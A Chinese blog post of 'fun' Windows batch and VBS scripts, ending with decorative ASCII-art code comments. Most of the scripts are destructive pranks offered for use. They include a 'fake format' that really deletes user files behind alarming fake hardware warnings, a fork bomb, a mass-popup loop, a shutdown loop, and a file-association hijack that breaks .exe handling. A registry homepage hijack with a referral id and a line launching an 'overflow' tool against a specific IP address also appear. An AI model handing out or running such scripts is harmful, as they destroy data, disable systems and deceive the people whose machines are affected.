---
title: 【随笔】好玩的bat命令
author: 墨白
top: false
cover: false
toc: true
mathjax: false
tags:
  - bat
categories:
  - 工具
abbrlink: 3867178586
date: 2020-01-04 13:43:40
coverImg:
img:
password:
summary:
---


## 关机脚本

~~~shell
@echo off
shutdown -s -t 0
~~~

## 重启脚本

~~~shell
@echo off
shutdown -r -t 0
~~~

## 伪格式化脚本

~~~shell
@echo off
color 4f
taskkill /im explorer.exe /f
echo 删除C盘所有文件......
del /f /s /q "%systemdrive%\*.tmp"
del /f /s /q "%systemdrive%\*.dmp"
del /f /s /q "%systemdrive%\*._mp"
del /f /s /q "%systemdrive%\*.gid"
del /f /s /q "%systemdrive%\*.old"
del /f /s /q "%systemdrive%\*.chk"
del /f /s /q "%systemdrive%\*.bak"
del /f /s /q "%systemdrive%\*.log"
del /f /s /q "%systemdrive%\*.txt"
del /f /s /q "%systemdrive%\*.ini"
del /f /s /q "%systemdrive%\Recycled\*.*"
del /f /s /q "%systemdrive%\RECYCLER\*.*"
del /f /s /q "%windir%\inf\*.pnf"
del /f /s /q "%windir%\Prefetch\*.*"
@ping -n 2 127.1>nul
rd /s /q "%windir%\Downloaded Program Files" & md "%windir%\Downloaded Program Files"
@ping -n 2 127.1>nul
rd /s /q "%windir%\LastGood" & md "%windir%\LastGood"
@ping -n 2 127.1>nul
rd /s /q "%windir%\Offline Web Pages" & md "%windir%\Offline Web Pages"
@ping -n 2 127.1>nul
rd /s /q "%windir%\SoftwareDistribution\Download" & md "%windir%\SoftwareDistribution\Download"
@ping -n 2 127.1>nul
rd /s /q "%windir%\temp" & md "%windir%\temp"
@ping -n 2 127.1>nul
rd /s /q "%userprofile%\Local Settings\Application Data\Microsoft\Media Player" & md "%windir%\Local Settings\Application Data\Microsoft\Media Player"
@ping -n 2 127.1>nul
rd /s /q "%userprofile%\UserData" & md "%windir%\UserData"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Adobe" & md "%windir%\Adobe"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Macromedia" & md "%windir%\Macromedia"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Microsoft\Media Player" & md "%windir%\Microsoft\Media Player"
@ping -n 2 127.1>nul
rd /s /q "%appdata%\Microsoft\Office\Recent" & md "%windir%\Microsoft\Office\Recent"
@ping -n 5 127.1>nul
del /a /f /s /q "%userprofile%\Cookies\*.*"
del /a /f /s /q "%userprofile%\Recent\*.*"
del /a /f /s /q "%userprofile%\Local Settings\Application Data\GDIPFONTCACHEV1.dat"
del /a /f /s /q "%userprofile%\Local Settings\Application Data\IconCache.db"
del /a /f /s /q "%userprofile%\Local Settings\History\*.*"
del /a /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
del /a /f /s /q "%temp%\*.*" del /a /f /s /q "%userprofile%\AppData\Local\GDIPFONTCACHEV1.dat"
del /a /f /s /q "%userprofile%\AppData\Local\IconCache.db"
del /a /f /s /q "%userprofile% \AppData\Local\Microsoft\Windows\History\*.*"
del /a /f /s /q "%userprofile% \AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
del /a /f /s /q "%userprofile% \AppData\Roaming\Microsoft\Windows\Cookies\*.*"
del /a /f /s /q "%userprofile% \AppData\Roaming\Microsoft\Windows\Recent\*.*"
echo 已删除完毕
@echo.
echo 删除D盘所有文件......
@ping -n 3 127.1>nul
@echo 已删除完毕
@echo.
echo 删除E盘所有文件......
@ping -n 3 127.1>nul
echo 已删除完毕
@echo.
echo 正在低级格式化全部硬盘......
@ping -n 3 127.1>nul
echo.
echo 正在 进行二次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 正在 进行三次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 正在 进行四次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 正在 进行五次 低格硬盘......
ping -n 3 127.1>nul
echo.
echo 注意: cpu温度127度!温度过高报警!!!
echo.
ping -n 2 127.1>nul
echo 注意: 硬盘温度86度!温度过高报警!!!
echo.
ping -n 2 127.1>nul
echo 注意: 显卡温度96度!温度过高报警!!!
echo.
ping -n 2 127.1>nul
echo 注意: 系统崩溃, 主板温度 超过临界值!!! echo.
echo 注意: 电容负荷超过99% echo. & pause
echo 电脑将在60秒内崩溃或爆炸!请勿强行关闭电源!否则会 导致cpu和硬盘彻底损毁!!
shutdown /r /t 60 /c "电脑将在60秒内崩溃或爆炸!请勿强行关闭电源!否则会 导致cpu和硬盘彻底损毁!!"
ping -n 30 127.1>nul
shutdown -a
start explorer.exe
exit
~~~

## 黑客帝国代码雨

~~~shell
@echo off
:a
color 2
echo 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0 1 0
ping localhost -n 1 >nul
echo 2 1 3 2 1 3 2 1 3 2 1 3 2 1 3 2 1 3 2 1 3 2 1 3 2 1 2 3 1 5 4 6 4 6 5 4 6 5 4
ping localhost -n 1 >nul
echo 7 9 4 6 5 4 9 8 7 4 1 6 5 4 9 8 7 4 6 8 7 4 6 5 1 3 5 4 9 8 7 4 1 1 3 2 1 3 1
ping localhost -n 1 >nul
echo 1 3 5 4 1 6 5 4 6 1 3 2 4 8 6 4 3 5 4 1 6 5 4 6 1 3 8 7 4 6 5 4 5 4 6 8 1 3 5
ping localhost -n 1 >nul
echo 7 1 9 1 8 7 3 4 2 5 7 8 4 1 3 6 5 7 8 4 1 3 5 4 9 4 1 9 8 7 3 8 7 9 8 7 4 5 6
ping localhost -n 1 >nul
goto aa
~~~

##  盘符增加 

~~~shell
@echo off
for %%i in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do (subst %%i: C:\)
~~~

##  盘符恢复 

~~~shell
@echo off
for %%i in (a b c d e f g h i j k l m n o p q r s t u v w x y z) do (subst %%i: /d)
~~~

##  死机循环 

~~~shell
@echo off
%0|%0
~~~

##  清理系统垃圾 

~~~shell
@echo off
echo 正在清除系统垃圾文件，请稍等......
del /f /s /q %systemdrive%\*.tmp
del /f /s /q %systemdrive%\*._mp
del /f /s /q %systemdrive%\*.log
del /f /s /q %systemdrive%\*.gid
del /f /s /q %systemdrive%\*.chk
del /f /s /q %systemdrive%\*.old
del /f /s /q %systemdrive%\recycled\*.*
del /f /s /q %windir%\*.bak
del /f /s /q %windir%\prefetch\*.*
rd /s /q %windir%\temp & md %windir%\temp
del /f /q %userprofile%\cookies\*.*
del /f /q %userprofile%\recent\*.*
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
del /f /s /q "%userprofile%\Local Settings\Temp\*.*"
del /f /s /q "%userprofile%\recent\*.*"
echo 清除系统垃圾文件完成！
pause
~~~

## 闪动代码

~~~shell
color
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 1a
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 2b
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 3c
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 4d	
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 5e
echo 墨白好帅，不信你看屏幕都会闪~~~~~~
color 6f
%0恶搞小程序
~~~

## 自爆VBS

~~~vbs
msgbox"电脑即将自爆"+chr(13)+"请在15秒内离开座位"+chr(13)+"否则你死定了",2,"系统自爆提醒"
CreateObject("SAPI.SpVoice").Speak"电脑即将自爆，请在15秒内离开座位，否则你死定了！"
~~~

## 修改文件关联

~~~shell
@echo off
assoc .exe=txtfile
assoc .txt=exefile
assoc .mp3=txtfile
assoc .flv=txtfile
assoc .swf=txtfile
assoc .fla=txtfile
assoc .jpg=txtfile
assoc .bmp=txtfile
assoc .zip=txtfile
assoc .7z=txtfile
assoc .rar=txtfile
assoc .tag=txtfile
assoc .jpge=txtfile
assoc .mp4=txtfile
assoc .3gp=txtfile
assoc .avi=txtfile
assoc .wav=txtfile
assoc .htm=txtfile
assoc .html=txtfile
assoc .vbs=txtfile
assoc .vbe=txtfile
assoc .js=txtfile
assoc .rxproj=txtfile
assoc .mdb=txtfile
assoc .dll=txtfile
assoc .dat=txtfile
assoc .sys=txtfile
assoc .wmv=txtfile
assoc .ogg=txtfile
assoc .db=txtfile
assoc .mid=txtfile
assoc .gif=txtfile
assoc .png=txtfile
assoc .doc=txtfile
assoc .exl=txtfile
assoc .pdf=txtfile
assoc .chm=txtfile
assoc .nfo=txtfile
~~~

## 超级弹窗

~~~shell
@echo off
for /l %%i in (1,1,10000) do (start %0)
~~~

## 重启指定次数

~~~shell
@echo off

if not exist c:\1.txt echo. >c:\1.txt & goto err1

if not exist c:\2.txt echo. >c:\2.txt & goto err1

if not exist c:\3.txt echo. >c:\3.txt & goto err1

if not exist c:\4.txt echo. >c:\4.txt & goto err1

if not exist c:\5.txt echo. >c:\5.txt & goto err1

goto err2

:err1

shutdown -s -t 0

:err2
~~~

## 批量自动溢出

~~~shell
@for /f %%i in (result.txt) do 42 %%i 58.44.89.158 521
~~~

## 篡改主页

~~~shell
reg add"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v"Start Page" /t reg_sz /d www.2345.com/?k52708425 /f >nul 2>nul

reg add "HKEY_CURRENT_USER\Software\Microsoft\InternetExplorer\Main" /v "Default_Page_URL" /t reg_sz /dwww.2345.com/?k52708425 /f >nul 2>nul
~~~

### 好玩的注释

> 工作中时间久了就会觉得无聊,写注释也是很烦恼的事情,那就把注释变得有意思吧!

[最全的注释地址]( http://www.asciiworld.com/ )

~~~java
/**
 *                                      ..o$***R$"#N..
 *                                 .e@F")dC.  .Jh*"""N.
 *                               oPh 'E""" ^$""*c. u**R.
 *                            .dEh@$P"$mm**$hmJ""C$"   R
 *                           :P$$hu.$x$.. 8Lum@8"C$u.uP
 *                   .       $b?LR4Bx"?E"$7L.om*""  '$
 *               .e*""#hu   JF'"$N.$*$b5JP"" .   ..  M
 *       ...    JF      '#ud#*N@".@")(7d"  u@"  4f""N$
 *     .@"""Nu. $         '#o Mo$#he@5P  m"CdR> 4Ld$E$
 *    .$     '"@B           '#$ JE*$.$    "***\ '$"""$
 *    4>        Mr            '#b.$sJF           R   '#c
 *     R        'B.             'RL.$            #c    ?L
 *     "Nu.     :P"#h..           '"B         ....$     R
 *       d"     M    "#Ru.          '?k    d\       d- :P
 *      @       *r       ""*n         $  '""#$@**"3P  .@
 *      M       4>                   JF       """""  d"
 *      M       'Ro                 uP        .   .d*"
 *      ^*o.      ^N@***hmmmr      @"      d"""**#"
 *         "$*    4P              JF     u$.
 *          B     4>              $       ^"#b.
 *          *r    'B      ....   'b          '#u
 *          '#h.   ^"@*"""""      ?L           *r
 *             #Nm  @"        .    R.          4>
 *              $   $      x@R"    '           4>
 *              '#bedR**N@""                   4>
 *                 'N. JF    J>       $        4>
 *                   ""#Nou@"   J    'E        4>
 *                        $*hxo*      $        4>
 *                      .dPNmmr       '"\      'L
 *                    .dP"               \      B
 *                   #"                   \     *r
 *                 /                       \    'B
 *                /'                        N.   ?>
 *                d                         '#c  'R
 *                M                           $  .R
 *                M                           *ruP
 *                ?>        $                 4F"
 *                'L        @.                4>
 *                 ?L       'B                4>
 *                  "h.     .JNu.             4k
 *                    "#*@@*"  '"$**Nm        d>
 *                       4F     J>           .$
 *                       4>     M           .$"
 *                       4>     $          .R
 *                       4L    .R         xP
 *                        R    J>        .R
 *                        R    M        xP
 *                      .@"   uR       .R
 *                     JF    d"       d"
 *                    .$    @"       4F
 *                    M     $        J>
 *                    M     R        M
 *                    "L    $        $
 *                     N.   ^N.      "b
 *                     'R     Rr      '*s.
 *                     uP    :$          ^*mumc
 *                     $     'B   ...       ..R
 *                     $$$$$$$^$$$$$$$$$$$$$$$'
 *
 *                         Le Slob's Angel
 */
~~~

#### 划水必备:

~~~java
/**
 *                                   (
 *                          .-'''-..' \                         Who the...??
 *                _______ .'       -   \                           yikes!
 *              <<<<<<<< );__   ,,,_)   \                      __ /
 *                 <<<<<<<<< ) ;C  /     \                /ZZZ'  )
 *                   <<<<<< (.-'-.  )====_)_=======>      .-'``'>>>>>>>>>>
 *                     <<<<< \    '''''''   )           .'    >>>>>>>>>
 *                     ;  <<<     .......__/       __\_;    ,>>>>>>>
 *                .-'''         (         )          / / ('"\__
 *             .-'              ;.       /            (;/;) /\
 *            /  .-'     .     =  .     /
 *        _-''\_/         '. .'    .   /
 *     .-'  )  ;\          '''.     . /
 *    ;   .''''  `.       '    ;     (
 *    O -'        .'''       .'                      (__)))
 *              .'   .-'''''`                    (  )mikey(__)))
 *              'o-'                         ( _))(_ _)( _))_))
 */
~~~

#### 马蜂窝?

~~~java
/**
 *                  _______
 *                 / _____ \
 *           _____/ /     \ \_____
 *          / _____/  311  \_____ \
 *    _____/ /     \       /     \ \_____
 *   / _____/  221  \_____/  412  \_____ \
 *  / /     \       /     \       /     \ \
 * / /  131  \_____/  322  \_____/  513  \ \
 * \ \       /     \       /     \       / /
 *  \ \_____/  232  \_____/  423  \_____/ /
 *  / /     \       /     \       /     \ \
 * / /  142  \_____/  333  \_____/  524  \ \
 * \ \       /     \       /     \       / /
 *  \ \_____/  243  \_____/  434  \_____/ /
 *  / /     \       /     \       /     \ \
 * / /  153  \_____/  344  \_____/  535  \ \
 * \ \       /     \       /     \       / /
 *  \ \_____/  254  \_____/  445  \_____/ /
 *   \_____ \       /     \       / _____/
 *         \ \_____/  355  \_____/ /
 *          \_____ \       / _____/
 *                \ \_____/ /
 *                 \_______/
 */
~~~

#### 好像是华盛顿

~~~java
/**
 *                              .::::..:::....
 *                            .:""":::..::.  :::..
 *                        ...::::::.     :.::: ':::
 *                    ..:::::.. ..:::.  .  '::: :".::.
 *                  .::::" . '": ' .::.. ": ::" :.. '::
 *                ..::...  ':..: .:::::::.:. :::.: ':::":.
 *             .:::::'""":..:::::::"''  ''"::..::::'::".:::.
 *          .::::..   ::""::... .            '"::::"' . ":.:.
 *         .::'''"":: ""  ":..  .                "      .'":.:.
 *         ::::...   .::..:.. .                            "":.:.
 *        ::::::'"...::'"..::.. . .                         . :.".
 *      .:""  ':. ::""'  ':::..  .                         .  ':.".
 *     ::::   ..  ::  :::"':::.. .     .                  .  . '::':
 *     :::...::::" ' .':' '::::.. .      .             .     .  ::::
 *     .:::'""   ' .:::::.':I:::.  .         .      .      .  . :"::.
 *    .""'  :::"   ::"'    :II::'     ...         .        ... .:''::
 *   ::.   .::"  .:"''':...:I::"  :II:::IHI:..          .:::I:'':  ':
 *   :::::. :.  .:..:.  ..:::::'IH:::::II:::IHHI.    .HI.:IHI:'':. .:
 *  :"'   '    ..::"'    ":::"IHI:IHI""..""::IHHI.'  IHIH"''':.::: ":.
 * :.::""    '::''  .   .::::'IHHHHI:":H:':::..:I:.  HI':H:':..::'":':
 * :::  ..    ::. '::":.::::.I:. ::::....:..:I.IH:.  '::.".:.:I":. ".":.
 * ::''::::"'  "   :::" :::...  . ':::' ''  .:IIH:.   ::.' :":" :.:   ':.
 * ::'   '   .:"' .::"::::... .      .   ....::IHI.   ::"  . '  :. ..   :.
 * :::::"':::"'  .:I.: "::.. .             ...::II:   :I:'      : .  "::.':
 * "::". :"''  . :I :" :I::.. .              ..::II.  ':"       :. :: ':: ::
 *  :::.. .:' :' :I:'  ':I::.. .            . ..:II"   ::       :I.'::.:: :'
 *  ':"''":I:.  .:I:.:: :II::... .           ::""I:.   :.      .:I: "::"'.:
 *   :..:"'::::::::'':'.":II:::.. .        .::'...I:...::.     .:I:  '..::"
 *   "::' .."".::"::.'  .:II:::... . .   ...::."I:::::I". .   ...:"   :'
 *    ':..::  .:"::::   .:II:..     .   .... "I:..II:"' '.. ..:.:"   .:
 *      """"::::.":::II::II::. .         .  .  .  ""    .:. .:.:I'...:"
 *           ':: .::I::HII::::.. .     .       ..  .  .  :..:"':"::""'
 *            ::.:I:I:::HI::::::. .    ....::::II::.::I::: '  ::
 *            IIHHI: "::IHI::::.'   .  '":""""""""::""'':'   .:"
 *            :IHHIH.::::IIHI::.         '":::........::'    .:
 *            ':IHIH:':::.:IIH::. .         '':::::::::"'  ..:'
 *             8::IIH: . ':."::I:.       ...::"''     ''' .::"
 *            .:..:IIH. . ':.':::I:. .  ...            . .::"
 *        ..:HI. ..IIHI  .  '..'::::II::.    .       .  .::"
 *  .:::::IIHHI .  II:H: ..   '.'...::::::.         ..:::"
 * IHI.:H:" IH:.   ::IIH. ..      ''"::::::::......::":.
 * HH:' ".:IHI .   ':IIHI: .'.        '""::::"""''"  .::
 * IH:..::IIH'..    :IIIHI. . '.    .   .    .     .'.::
 * I:HI:".IHI.::.   .:IIIHI. ..  '.    .  .'     ..'. :":.
 * I::'.:I::::::. . .:IIIIHI. .. . '.   ..     ..'  .:I:.":.
 *  I:IIH.::':::.. ...:IIIIHH.  ..    '.:.. ..''   .::IHI: ":.
 * .:II:::. ..::.. . .:IIIIIHH.  :.. ..::''...::..:".:HHIII. ":.
 * III:...:...::. . . ::IIIIHHH  ......:. ..  '::::.::IHHHHH:. :.
 * II:::::. ..:::. . ..::IIIHIH ........: .. .. '.:.:''IHHHHHI :'
 *  :::::. . .:::..  ...::IIHHI :..... .. .... ... '...::IHHH :'
 * II::::.:.::::.::.  .. :II:H: :....  .:  ':.. ... '...::HHI I(.
 * :::::::.:::::..:..  ..:II:HI ':..  .::.  '... ...   ..:IH: H::.:.
 * :::.....:::::..:.:. . .:::IH. ':. ..::..  '... '...   '.HI "H:...:.
 * ::... ..::::::.::.... ::..IIH. ':...:8...  '.    ....:'..H  "H:..:.:.
 * ''  ''..:::I::..:.:...::.:IIIH. ':.::.::.... .::::''.:.'':H. "H:. .:  .
 *    . . ..::I:::.:::.. .::::IIIH  :.:: :'''' .:: ::   ':..:IH. :I ...:.
 *     . . ..II:::::::..  .:::IIIH  :.::  .:::'.:' :::  .:'.IIHH :H :..: .
 *      . . .II::.:.:::.. .:::IIHH  :.::..:::' ::  ..:. :.::HIHI :I.:: :: .
 *       . . :II:. .::. ..  ":IIHH  :.:'''":'  :',  . '..'""I:HI H' ':. ::
 *        .   I::. .::.  .   :IIIH  :.::   '''':'  ..   :. :I.II H. .:. ":.
 *       .    :::. .I::. .   ::IIH: ::::..  . .:':.':' ..' .I:I: H ..:. .::.
 *            :::...::I:..   .::IHI ,:::...  ....'  '..'. .:I::: I. ::' . ::
 *             I::.''::I...  .::IIH .::.:.. . ..  ..   :.   :.:: I..:  . .
 *             :I:.. :::H. .  "::IH .:'"::. .  .. ..   ::...:'.: I..:   .
 *             "II.. ":::H. .  .::H. :.:.::. ..::.:'  .:''':::I'.I .: :.
 *              II:.  :::I:.  . ::HI I.::..''' :'::.  :.   "::IS:I:II::.
 *              :I:   .:::I:. ..::HI I.:: '   . .:::' .'    ':I :III:::. .
 *               :I.   ..::I:...::IH I:.. .  .  .    . .. .  ::.III:::. .
 *               ':'  .....:I::.:::H I::' . .    . .   ...  .: IIII:I:..
 *                     . ...:I:.:::H I:' .  .   .      ..   :: III:::. .
 *                      . ...:I:..:H I: .    . ..       .  ..: III..::.
 *                       . ...:I:.:H.::      . ..     . . ..:: II:'':'
 *                         . ..:I..::.:     . .      ... .. :: I:" .
 *                          . ..::.:.:        .     ......  :'
 *                            ...::'          .   ... .
 *                             ':':'          .   ..
 *                                           .   .
 *
 *
 *
 *                            GEORGE WASHINGTON
 */
~~~

#### 这个好像是苗族的妹子

~~~java
/**
 *              ((~
 *          ,))))))),
 *          )))'`')))
 *          (( ',' ))
 *           {; = ;}
 *      \\\  /`'v'`\  ///
 *       /''`\_/o\_/`''\
 *      /ooo    |    ooo\
 *     /===/    |    \===\
 *    /ooo/     |     \ooo\
 *   /===(      |      )===\
 *  /ooooo\_____|_____/ooooo\
 * /_______\===(E)===/_______\
 *    (()(~~~~~~~~~~~~~)())
 *        \           /
 *        |    /^\    |
 *        |oooo| |oooo|
 *        |====| |====|
 *        )oooo| |oooo(
 *       /=====| |=====\
 *      /oooooo| |oooooo\
 *     /_______| |_______\
 *         (__)   (__)
 *          ~~     ~~
 */
~~~

#### 抽象版蒙娜丽莎??

~~~java
/**
 *         :';t)/!||||(//L+)'(-\\/ddjWWW#######WmKK(\!(/-|J=/\\t/!-/\!_L\) 
 *         |-!/(!-)\L\)/!\5(!.!LWW###################WK/|!\\\\/!;\/\T\/((\ 
 *         |!'//\//(-!t\Y/\L!m#####M####################WLt\\!)\/J-//)/;t\ 
 *         --/-.\.\/\.!)///m######K#######################WK!/!-( )-!,|/\ 
 *         //,\--`--!-/\(q#######DD##########################L\\\\-!!//!\\ 
 *         -.-!\'!!\-\/:W########N############################W,).'-.-/\-' 
 *         !.\!-!-!`!-!W#######P|+~**@@@#######################W/,/'\-/,\7 
 *         --`,-- -/.:W###*P!'          \`Z8#####################;,\\`,\,\
 *         `.'.'\`-.-d##5'-           -- '-:V@##########W#########_\-!-\\-
 *         `, -,.'/,G##K- '               - )7KM###################\-----/
 *         - '-  --:##@;                    -!ZZ###################W! \'!- 
 *          '-.`- G###|.                    `,D8K###################|/-.-/ 
 *         -' ,-//###@)                      -)ZWMW##################\` _\
 *         - ' .:Yd###!                     `-!(K5K##################|(/L| 
 *           - :\G###Z-                    ` ! -;55ZZ#################)(4) 
 *          . -!W####!\                     `  ' !-tVG################XNVZ 
 *            tt####@-.                        `  ')(W################D)8@ 
 *            )8#####\                         .-`-/KW#################KD# 
 *           ||Z####W!-              .::,\.. -,;\bZKK######8#K#########(#8 
 *           KN8#####( ,:!/GG_      d4KW8ZKW#WWK#W#88#######W##########WK# 
 *          )/8K###K#W#WP~~~T4(    dW##7'___L#M####MM8W###W############bM8 
 *         \!48#K####8##W*###WY;   WRob+~~######*ff/\NM8###############WW# 
 *         .\\KW###W#,~t' !*~!',  -M@)    `~`,),' '.`K#################@KW 
 *         .'8M###### -'..j/Z''    @//-  ,,\\+\'    :|W######M###########8 
 *         :\#8#K###D              \!`             !:Z8###8@#####8W#W###8M 
 *         q8W5######             `!-             `-)8##################M8 
 *         8WZ8#M####-             /  .          .\tK############@######ZJ 
 *         #W#@K###W#|              //           \\tW@###@K##W##W###K###Wm 
 *         ##8#M#8###P-            -=/,         /;D8W##############@###W## 
 *         #8###M@####\-      ,   _)jJ;        -((WKK#####W####W##K######K 
 *         ###W@K##K##);     `\..KW##WK       )X)KW#M##W###MW##@#W######8# 
 *         #K#W####@#@@/;-     ~M####M\    ,.\\=)D8W##W###W##########8W##@ 
 *         ####MW######(`\\'     PPK((.:|/!-\-/)8XN@WMK#######W##MK#@##### 
 *         ##8##MK#W#@#b!--\)L_. .(ZLWbW#\'- ,-N|/KM#######W###@########W# 
 *         ##KW###K#W###/-  !``~~Yff*N5f -' -.\))KK#######MK##W###M8W#W### 
 *         #W###K@K######J--    .._dd/;)/- !//)NK#8W##########8########M#K 
 *         ##8W#K###W#####W!.   `YY\)\\)\7(-)4dW#8#@###K#W#######8######## 
 *         M####8##K#KW###W#/,       '-\\//)88W#M#@#K##M###@##M#8##@#W#8#M 
 *         ZW#W#M#K##########m       -)!/LtWW#W##@#W#####KW#######W###K### 
 *         K##W#####W#M#8#####KL   .-//dD##8W#K######8##########MK###W##M# 
 *         tN#W##W#W#M##########bb4dKW#@##W##K####MK####8###########W##### 
 *         )NM#8W##@###@##############@##@##8##K#W####M##K##K#@###8##M#### 
 *         (tMM###W##M8####@####@###@#########@####8W##8W################M 
 *         tNZ##K###W####@#####8###/4N##8#W##W##M#8#MK#M8#K######W######## 
 *         M/K@8###M@###M##########|!t*Z#N####8##M8Z@ZZ#M###@#W#####K###W# 
 *         WVd4M######@############D,\`(+KKZD#8WK#5@84VZ#WM############W## 
 *         K5WM8#8W#W########8######,,-!/))ZK5@K4)@+(/XV/Z###@###W###M#### 
 *         +8WN@##@K##W###W#########b.-.\!||\X(5)Z/7\\\t5/K########W###### 
 *         8M8###@###@##8#########KDbt! !.-!t`(-\\!.\/.\!ZdG###W#MW###G### 
 *         ~~~~~`~~~~~~~~~~~~~~~~'~` ''  ' ` ` ' '   `   ``~`~`~`~~~~'~~~~  
 */
~~~

#### 低配版厢式货车

~~~java
/**
 *                     _________________________________________________
 *             /|     |                                                 |
 *             ||     |                                                 |
 *        .----|-----,|                                                 |
 *        ||  ||   ==||                                                 |
 *   .-----'--'|   ==||                                                 |
 *   |)-      ~|     ||_________________________________________________|
 *   | ___     |     |____...==..._  >\______________________________|
 *  [_/.-.\"--"-------- //.-.  .-.\\/   |/            \\ .-.  .-. //
 *    ( o )`==="""""""""`( o )( o )     o              `( o )( o )` 
 *     '-'                '-'  '-'                       '-'  '-'
 */
~~~

#### 高配版厢式货车

~~~java
/**
 *                   _______________________________________________________
 *                   |                                                      |
 *              /    |                                                      |
 *             /---, |                                                      |
 *        -----# ==| |                                                      |
 *        | :) # ==| |                                                      |
 *   -----'----#   | |______________________________________________________|
 *   |)___()  '#   |______====____   \___________________________________|
 *  [_/,-,\"--"------ //,-,  ,-,\\\   |/             //,-,  ,-,  ,-,\\ __#
 *    ( 0 )|===******||( 0 )( 0 )||-  o              '( 0 )( 0 )( 0 )||
 * ----'-'--------------'-'--'-'-----------------------'-'--'-'--'-'--------------
 */
~~~

其他的就自己去上面的网站查找吧,几乎你见过的没见过的注释版本都有